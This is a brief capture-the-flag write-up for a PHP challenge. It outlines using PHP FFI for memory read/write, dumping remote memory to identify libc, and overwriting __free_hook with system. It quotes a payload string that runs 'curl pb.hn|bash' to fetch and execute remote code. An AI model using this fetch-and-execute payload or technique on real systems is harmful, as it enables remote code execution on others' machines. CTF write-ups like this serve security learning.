# NoEasyPHP

- FFI was enabled, easy arbitrary read/write in memory
- Dumped like 20 mb of remote memory to figure out their libc version, code in [sice.py](sice.py)
- Overwrite __free_hook with system and freed a string with ";curl pb.hn|bash;#" in it, giving command exec
- Final exploit in [solve.php](solve.php)
